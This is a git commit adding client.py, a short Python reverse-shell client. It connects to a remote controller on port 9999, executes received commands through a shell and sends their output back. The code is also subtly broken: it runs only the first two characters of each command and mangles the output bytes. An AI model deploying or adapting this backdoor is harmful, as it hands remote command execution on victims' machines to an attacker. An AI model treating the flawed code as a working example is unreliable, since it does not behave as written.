039291fdc587abd6379918405fa31306585a9477
John Pinto <59218902+pj8912@users.noreply.github.com>
2022-08-21 07:09:46 +0530

    intial commit

---
+++ client.py
@@ -0,0 +1,32 @@
+import socket
+import os 
+import subprocess
+import platform
+
+s = socket.socket()
+#s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
+
+host=""
+port = 9999
+
+s.connect((host,port))
+name = platform.system().encode('utf-8')
+#s.send(name)
+
+while True:
+    
+    data = s.recv(1024)
+    
+    
+
+    if data[:2].decode('utf-8') == "cd":
+        os.chdir(data[3:].decode('utf-8'))
+
+    
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:2].decode('utf-8'), shell=True,stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE) #open up a procees
+
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte).encode('utf-8')
+        currentWD = os.getcwd() + "> "
+        s.send(output_str + currentWD.encode('utf-8'))
